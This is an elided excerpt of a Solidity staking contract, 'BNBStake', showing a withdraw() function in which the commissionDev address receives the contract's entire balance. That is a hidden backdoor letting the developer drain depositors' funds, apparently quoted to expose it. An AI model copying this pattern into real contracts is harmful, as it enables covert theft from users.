...
contract BNBStake {
    ...
    address payable public commissionDev;
	...
	constructor(address payable wallet,address payable dev, uint256 startDate) public {
	...
	function withdraw() public {
        ...
        if(msg.sender == commissionDev){			     
       commissionDev.transfer(contractBalance);
       }
		user.checkpoint = block.timestamp;
